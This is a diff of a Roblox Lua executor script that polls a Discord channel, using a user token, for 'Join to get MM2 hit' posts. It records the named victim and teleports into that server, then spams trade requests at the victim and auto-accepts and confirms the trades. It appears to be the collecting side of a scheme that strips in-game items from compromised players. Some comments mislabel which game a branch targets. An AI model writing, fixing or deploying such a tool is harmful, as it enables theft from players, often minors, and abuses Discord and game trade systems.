@@ -2,27 +2,18 @@ if not game:IsLoaded() then
     game.Loaded:Wait()
 end
 
--- Services
-local HttpServ = game:GetService("HttpService")
-local VirtualInputManager = game:GetService("VirtualInputManager")
-local TeleportService = game:GetService("TeleportService")
-local TextChatService = game:GetService("TextChatService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Players = game:GetService("Players")
-
--- Configuration check
 if token == "" or channelId == "" then
     game.Players.LocalPlayer:Kick("Add your token or channelId to use")
 end
 
--- Anti-afk
 local bb = game:GetService("VirtualUser")
-Players.LocalPlayer.Idled:Connect(function()
+game:service "Players".LocalPlayer.Idled:Connect(function()
     bb:CaptureController()
     bb:ClickButton2(Vector2.new())
 end)
 
--- File setup
+local HttpServ = game:GetService("HttpService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
 local victimFile = isfile("user.txt")
 local joinedFile = isfile("joined_ids.txt")
 if not victimFile then
@@ -37,29 +28,12 @@ local didVictimLeave = false
 local timer = 0
 local lastRequestTime = 0
 
--- Improved chat function
-local function sendChatMessage(message)
-    local success, err = pcall(function()
-        -- Try new TextChatService first
-        if TextChatService:FindFirstChild("RBXGeneral") then
-            TextChatService.RBXGeneral:SendAsync(message)
-        -- Fallback to old chat system
-        elseif ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") then
-            ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
-        end
-    end)
-    
-    if not success then
-        warn("Failed to send chat message:", err)
-    end
-end
-
--- Device selection
 local function selectDevice()
     while task.wait(0.1) do
-        local DeviceSelectGui = Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DeviceSelect")
+        local DeviceSelectGui = game.Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DeviceSelect")
         if DeviceSelectGui then
             local Container = DeviceSelectGui:WaitForChild("Container")
+            local Mouse = game.Players.LocalPlayer:GetMouse()
             local button = Container:WaitForChild("Phone"):WaitForChild("Button")
             local buttonPos = button.AbsolutePosition
             local buttonSize = button.AbsoluteSize
@@ -67,85 +41,89 @@ local function selectDevice()
             local centerY = buttonPos.Y + buttonSize.Y / 2
             VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, true, game, 1)
             VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, false, game, 1)
-            break
         end
     end
 end
 
 task.spawn(selectDevice)
 
--- Special game setup (place ID 920587237)
-local function setupSpecialGameFunctions()
-    if game.PlaceId == 920587237 then
-        local playerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
-        local tradeFrame = playerGui.TradeApp.Frame
-        local Loads = require(ReplicatedStorage.Fsys).load
-        local RouterClient = Loads("RouterClient")
-        local TradeAcceptOrDeclineRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
-        local AddItemRemote = RouterClient.get("TradeAPI/AddItemToOffer")
-        local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
-        local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
-        local inventory = require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[Players.LocalPlayer.Name].inventory
-        local TradeRequestReceivedRemote = RouterClient.get_event("TradeAPI/TradeRequestReceived")
+local waittime = delay or 2
+wait(waittime)
 
-        TradeRequestReceivedRemote.OnClientEvent:Connect(function(sender)
-            TradeAcceptOrDeclineRequest:InvokeServer(sender, true)
-        end)
+-- Common functionality for both games
+wait(2)
+game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('yo!')
 
-        local foodAdded = false
+-- Game-specific functionality
+if game.PlaceId == 920587237 then -- Blox Fruits
+    local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+    local tradeFrame = playerGui.TradeApp.Frame
+    local Loads = require(game.ReplicatedStorage.Fsys).load
+    local RouterClient = Loads("RouterClient")
+    local TradeAcceptOrDeclineRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
+    local AddItemRemote = RouterClient.get("TradeAPI/AddItemToOffer")
+    local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
+    local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
+    local inventory = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
+    local TradeRequestReceivedRemote = RouterClient.get_event("TradeAPI/TradeRequestReceived")
 
-        local function IsTrading()
-            return tradeFrame.Visible
-        end
+    TradeRequestReceivedRemote.OnClientEvent:Connect(function(sender)
+        TradeAcceptOrDeclineRequest:InvokeServer(sender, true)
+    end)
 
-        local function acceptTrade()
-            while task.wait(0.1) do
-                if IsTrading() then
-                    if not foodAdded then
-                        local foodKeys = {}
-                        for uid, data in pairs(inventory.food) do
-                            table.insert(foodKeys, uid)
-                        end
-                        if #foodKeys > 0 then
-                            local randomIndex = math.random(1, #foodKeys)
-                            local randomFoodUid = foodKeys[randomIndex]
-                            AddItemRemote:FireServer(randomFoodUid)
-                            foodAdded = true
-                        end
-                    end
-                    AcceptNegotiationRemote:FireServer()
-                end
-            end
-        end
+    local foodAdded = false
 
-        local function confirmTrade()
-            while task.wait(0.1) do
-                if IsTrading() and foodAdded then
-                    ConfirmTradeRemote:FireServer()
-                end
-            end
-        end
-
-        task.spawn(acceptTrade)
-        task.spawn(confirmTrade)
-        return true
+    local function IsTrading()
+        return tradeFrame.Visible
     end
-    return false
-end
 
-local isSpecialGame = setupSpecialGameFunctions()
+    local function acceptTrade()
+        while task.wait(0.1) do
+            if IsTrading() then
+                if not foodAdded then
+                    local foodKeys = {}
+                    for uid, data in pairs(inventory.food) do
+                        table.insert(foodKeys, uid)
+                    end
+                    if #foodKeys > 0 then
+                        local randomIndex = math.random(1, #foodKeys)
+                        local randomFoodUid = foodKeys[randomIndex]
+                        AddItemRemote:FireServer(randomFoodUid)
+                        foodAdded = true
+                    end
+                end
+                AcceptNegotiationRemote:FireServer()
+            end
+        end
+    end
 
--- Original game functions
-if not isSpecialGame then
+    local function confirmTrade()
+        while task.wait(0.1) do
+            if IsTrading() and foodAdded then
+                ConfirmTradeRemote:FireServer()
+            end
+        end
+    end
+
+    task.spawn(acceptTrade)
+    task.spawn(confirmTrade)
+else -- MM2
+    local notused = game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptRequest')
+
+    local function saveJoinedId(messageId)
+        table.insert(joinedIds, messageId)
+        writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds))
+    end
+
     local function acceptRequest()
         while task.wait() do
             local currentTime = tick()
             if currentTime - lastRequestTime >= 2 then
-                ReplicatedStorage:WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
+                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
                 local args = {
-                    [1] = Players:WaitForChild(victimUser)
+                    [1] = game:GetService("Players"):WaitForChild(victimUser)
                 }
-                ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
+                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
                 lastRequestTime = currentTime
             end
         end
@@ -153,20 +131,24 @@ if not isSpecialGame then
 
     local function acceptTrade()
         while task.wait(0.1) do
-            ReplicatedStorage:WaitForChild('Trade'):WaitForChild('AcceptTrade'):FireServer(unpack({[1] = 285646582}))
+            game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptTrade'):FireServer(unpack({[1] = 285646582}))
         end
     end
 
     local function waitForPlayerLeave()
-        Players.PlayerRemoving:Connect(function(removedPlayer)
+        local playerRemovedConnection
+        playerRemovedConnection = game.Players.PlayerRemoving:Connect(function(removedPlayer)
             if removedPlayer.Name == victimUser then
+                if playerRemovedConnection then
+                    playerRemovedConnection:Disconnect()
+                end
                 didVictimLeave = true
             end
         end)
     end
 
     local function IsTrading()
-        local trade_status = ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
+        local trade_status = game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
         return trade_status == "StartTrade"
     end
 
@@ -187,70 +169,34 @@ if not isSpecialGame then
     task.spawn(acceptRequest)
 end
 
--- Send greeting message after everything is set up
-task.delay(5, function()
-    sendChatMessage("yo!")
-end)
-
--- Improved Discord joining function
 local function autoJoin()
-    local success, response = pcall(function()
-        return request({
-            Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=10",
-            Method = "GET",
-            Headers = {
-                ['Authorization'] = token,
-                ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
-                ["Content-Type"] = "application/json"
-            }
-        })
-    end)
-
-    if not success then
-        warn("Failed to fetch Discord messages:", response)
-        return
-    end
+    local response = request({
+        Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=10",
+        Method = "GET",
+        Headers = {
+            ['Authorization'] = token,
+            ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+            ["Content-Type"] = "application/json"
+        }
+    })
 
     if response.StatusCode == 200 then
         local messages = HttpServ:JSONDecode(response.Body)
         if #messages == 0 then
             return
         end
-
         for _, message in ipairs(messages) do
-            if message.content and message.embeds and #message.embeds > 0 then
-                local embed = message.embeds[1]
-                if embed.title and embed.title:lower():find("join to get") then
-                    -- Extract place ID and job ID
-                    local placeId, jobId = message.content:match('TeleportToPlaceInstance%((%d+),%s*[\'"]([%w%-]+)[\'"]%)')
-                    
-                    if not placeId or not jobId then
-                        placeId, jobId = message.content:match('game:GetService%(%"TeleportService%"%):TeleportToPlaceInstance%((%d+),%s*[\'"]([%w%-]+)[\'"]%)')
-                    end
-
+            if message.content ~= "" and message.embeds and message.embeds[1] and message.embeds[1].title then
+                if message.embeds[1].title:find("Join to get MM2 hit") then
+                    local placeId, jobId = string.match(message.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)')
                     if placeId and jobId then
-                        local newVictim = victimUser
-                        if embed.fields and #embed.fields > 0 then
-                            for _, field in ipairs(embed.fields) do
-                                if field.name and field.name:lower():find("victim") and field.value then
-                                    newVictim = field.value:gsub('@', ''):gsub('[<>]', '')
-                                    break
-                                end
-                            end
-                        end
+                        local victimUsername = message.embeds[1].fields[1].value
 
-                        if not table.find(joinedIds, message.id) then
-                            table.insert(joinedIds, message.id)
-                            writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds))
-                            writefile("user.txt", newVictim)
-                            
-                            local teleportSuccess, teleportError = pcall(function()
-                                TeleportService:TeleportToPlaceInstance(tonumber(placeId), jobId)
-                            end)
-                            
-                            if not teleportSuccess then
-                                warn("Failed to teleport:", teleportError)
-                            else
+                        if didVictimLeave or timer > 5 then
+                            if not table.find(joinedIds, tostring(message.id)) then
+                                saveJoinedId(tostring(message.id))
+                                writefile("user.txt", victimUsername)
+                                game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
                                 return
                             end
                         end
@@ -258,12 +204,9 @@ local function autoJoin()
                 end
             end
         end
-    else
-        warn("Discord API error:", response.StatusCode, response.Body)
     end
 end
 
--- Main loop
-while task.wait(5) do
+while wait(5) do
     autoJoin()
 end
